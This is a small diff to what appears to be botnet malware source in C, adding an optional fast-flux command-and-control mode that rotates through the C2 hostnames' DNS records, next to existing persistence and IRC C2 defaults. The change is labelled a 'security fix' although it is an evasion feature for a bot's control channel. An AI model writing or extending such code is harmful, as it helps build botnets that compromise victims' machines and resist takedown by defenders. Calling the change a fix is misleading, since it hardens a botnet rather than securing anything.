@@ -80,6 +80,13 @@ static int init_bot(void) {
      * (config file or NOTNET_PERSIST_ENABLED=0) for RAM-only fileless mode. */
     g_bot.persist_enabled = 1;
     
+    /* SECURITY FIX (#85): Fast-flux C2 off by default — one hostname
+     * resolution per connect, identical to prior behavior. Set
+     * flux_enabled=1 to rotate through all A records of the C2
+     * hostnames every flux_ttl seconds. */
+    g_bot.flux_enabled = 0;
+    g_bot.flux_ttl = FLUX_DEFAULT_TTL;
+    
     /* Set default C2 config */
     strncpy(g_bot.c2_irc.server, IRC_DEFAULT_SERVER, sizeof(g_bot.c2_irc.server) - 1);
     g_bot.c2_irc.port = IRC_DEFAULT_PORT;
